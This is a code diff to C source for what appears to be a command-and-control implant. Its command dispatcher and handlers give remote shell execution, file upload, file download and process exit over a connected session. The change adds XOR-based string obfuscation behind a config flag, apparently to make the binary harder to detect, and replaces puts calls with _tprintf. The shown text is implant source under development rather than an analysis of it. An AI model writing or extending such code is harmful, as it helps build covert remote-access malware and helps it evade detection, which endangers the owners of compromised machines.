@@ -4,7 +4,8 @@
 #include <Package.h>
 #include <Core.h>
 #include <tchar.h>
-
+#include <Obf_Strings.h>
+#include <Config.h>
 
 #define REVNT_COMMAND_LENGTH 5
 
@@ -23,12 +24,17 @@ VOID CommandDispatcher()
     SIZE_T   DataSize    = 0;
     DWORD    TaskCommand = 0;
 
-    puts( "Command Dispatcher..." );
+#if CONFIG_OBF_STRINGS
+    unsigned char* obf_str = XOR_STR("Command Dispatcher...");
+    _tprintf(deobfuscate(obf_str) );
+#else
+    _tprintf( "Command Dispatcher...");
+#endif
 
     do
     {
         if ( ! Instance.Session.Connected ){
-            puts("Instance not connected...");
+            _tprintf("Instance not connected...");
             return;
         }
 
@@ -65,9 +71,9 @@ VOID CommandDispatcher()
                     }
 
                     if ( ! FoundCommand )
-                        puts( "Command not found !!" );
+                        _tprintf( "Command not found !!" );
 
-                } else puts( "Is COMMAND_NO_JOB" );
+                } else _tprintf( "Is COMMAND_NO_JOB" );
 
             } while ( Parser.Length > 4 );
 
@@ -80,7 +86,7 @@ VOID CommandDispatcher()
         }
         else
         {
-            puts( "Transport: Failed" );
+            _tprintf( "Transport: Failed" );
             break;
         }
 
@@ -91,7 +97,7 @@ VOID CommandDispatcher()
 
 VOID CommandShell( PPARSER Parser )
 {
-    puts( "Command::Shell" );
+    _tprintf( "Command::Shell" );
 
     DWORD   Length           = 0;
     PCHAR   Command          = NULL;
@@ -138,7 +144,7 @@ VOID CommandShell( PPARSER Parser )
 
 VOID CommandUpload( PPARSER Parser )
 {
-    puts( "Command::Upload" );
+    _tprintf( "Command::Upload" );
 
     PPACKAGE Package  = PackageCreate( COMMAND_UPLOAD );
     UINT32   FileSize = 0;
@@ -178,7 +184,7 @@ Cleanup:
 
 VOID CommandDownload( PPARSER Parser )
 {
-    puts( "Command::Download");
+    _tprintf( "Command::Download");
 
     PPACKAGE Package  = PackageCreate( COMMAND_DOWNLOAD );
     DWORD    FileSize = 0;
@@ -231,7 +237,7 @@ CleanupDownload:
 
 VOID CommandExit( PPARSER Parser )
 {
-    puts( "Command::Exit" );
+    _tprintf( "Command::Exit" );
 
     ExitProcess( 0 );
 }
